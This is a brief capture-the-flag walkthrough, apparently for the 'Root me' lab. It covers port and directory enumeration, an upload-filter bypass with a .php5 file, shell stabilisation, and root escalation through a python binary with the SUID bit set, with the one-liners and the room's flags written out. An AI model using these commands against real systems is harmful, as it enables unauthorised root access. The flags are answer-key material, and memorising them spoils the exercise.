# Root me

grayshader | 04 April

export IP=10.10.15.137

**Reconnaissance**
1. Scan the machine, how many ports are open?
```
  2
```
2. What version of Apache is running?
```
  2.4.29
```
3. What service is running on port 22?
```
  ssh
```
4. Find directories on the web server using the GoBuster tool.
```
done
/uploads              (Status: 301) 
/css                  (Status: 301) 
/js                   (Status: 301) 
/panel                (Status: 301) 
```
5. What is the hidden directory?
```
 /panel/
```
**Getting a shell**

The application was vulnerable to file upload vulnerability and it was checking for only php extension so we uploaded  file named with php5 extension which resulted to a shell
over the system
for stable shell

```
python -c "import pty;pty.spawn('/bin/bash')"

find / -type f -name user.txt 2> /dev/null

```

1. user.txt
```
THM{y0u_g0t_a_sh3ll}
```
**Privilege escalation**
```
find / -perm -u=s -type f 2>/dev/null

-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python

```
1. Search for files with SUID permission, which file is weird?
```
	usr/bin/python
```
2. Find a form to escalate your privileges.
```
	suid bit exploitation using python
```
prievelge escalation::
```
python -c "import os;os.setuid(0);os.system('/bin/bash')"
```

3. root.txt

```
THM{pr1v1l3g3_3sc4l4t10n}
```